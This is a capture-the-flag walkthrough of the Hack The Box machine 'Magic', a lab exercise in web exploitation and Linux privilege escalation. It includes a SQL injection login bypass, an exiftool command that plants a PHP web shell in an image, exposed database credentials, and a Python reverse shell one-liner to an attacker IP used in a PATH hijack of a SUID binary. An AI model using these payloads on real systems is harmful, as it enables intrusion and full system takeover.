# abstract

Magic is a medium box made by [@0_TRX](https://twitter.com/0_TRX). 

To crack the box you need an authentication bypass on the web interface. Afterwards you have admin permissions for the web application and can use these to upload images 
to the server. After that you modify your image and add PHP code to it. This code is used for a reverse shell.

Once you are on the system, after a short enumeration phase, you will find a way to extend your permissions by modifying the PATH variable.

# enumeration

## nmap

First up is the Nmap scan.

```

Ports 22 and 80 are open. Since 22 usually does not provide anything interesting, I consider port 80.

## Enumeration on Port 80

Port 80 provides a website where images are available. A login link is directly visible.

![magic.htb](../../../../assets/images/hackthebox/magic/0_magic.htb.png)

A further enumeration phase did not yield any further useful results. Therefore I tried a simple SQL injection.

![sql_injection](../../../../assets/images/hackthebox/magic/1_sql_injection.png)

Nice, it works.

# exploit

At this point I am able to manipulate the system with the images for the first time.
For this you have to know that the images appear under `/images/uploads/filename` after successful upload.

You can use this to inject source code into your image and then get the PHP interpreter to execute it.

In this case I inject code that should execute the parameter `cmd`.

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' mango.jpg 
```

![image modifications](../../../../assets/images/hackthebox/magic/2_image_mod.png)

Once insure that everything has worked out.

![modified image](../../../../assets/images/hackthebox/magic/3_modified_image.png)

Now a proof of concept. The command `ps` is passed as command and before the image is output in text form, you can see the output of the ps command behind the header.

![remote code execution](../../../../assets/images/hackthebox/magic/4_rce.png)

Unfortunately the default command for a reverse shell with `nc` did not work. So after some time I found out that Python3 is running, so I create a shell with it.

![low priv shell](../../../../assets/images/hackthebox/magic/5_shell.png)

At this point we are on the system, but only with low privileges.

## enumeration on victim

In the www directory you will find some files including the configuration for the MySQL database. Since the data could not be used directly to upgrade the shell to `theseus`.
I tried to dump the data of the MySQL server. Maybe you can find something useful there.

```php
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

## mysqldump

A simple MySQL dump provides a new password.

![mysqldump](../../../../assets/images/hackthebox/magic/6_mysqldump.png)

## user flag

You can use the password to upgrade your shell.

![userflag](../../../../assets/images/hackthebox/magic/7_userflag.png)

Now we are Theseus and have the user flag.

# persistence

If the connection should break off, you would have to repeat everything up to this step or automate the way before.

I have decided to store a SSH key to guarantee access even if the connection is interrupted.

```bash
ssh-keygen -t ed25519
```
![persistence](../../../../assets/images/hackthebox/magic/8_1_create_persistence.png)

When creating it I made sure to use `ed25519`. Not only because I find elliptical curves cooler, but simply because the string to be copied is shorter.

![persistence](../../../../assets/images/hackthebox/magic/8_create_persistence.png)

# privilege escalation

As Theseus, you must now try to become root. For this I have uploaded LinEnum to the server.

## enumeration

LinEnum returns an interesting line. The command `sysinfo` has set the SUID bit, now it's interesting to see what happens when sysinfo, which collects system information, is executed. 

![privesc_enum](../../../../assets/images/hackthebox/magic/9_privesc_enum.png)

I use `pspy64` for this, the tool shows me exactly what happens when sysinfo is running.

Among other things lshw is executed with the UID 0, which is root.

![lshw](../../../../assets/images/hackthebox/magic/10_lshw.png)

You can take advantage of this by extending the Path variable so that `lshw` is not taken from the `/usr/bin` directory but from the temp directory, for example.

From this moment on you have full control over what is executed.

```bash
export PATH=/tmp:$PATH
```

Now I create the file `/tmp/lshw` and write the following Python code into it:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.44",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I prepare a listener for the reverse shell on my local machine and run sysinfo.

```bash
# execute /bin/sysinfo
theseus@ubuntu:/tmp$ /bin/sysinfo
```

The listener gets the signal and I am `root`.
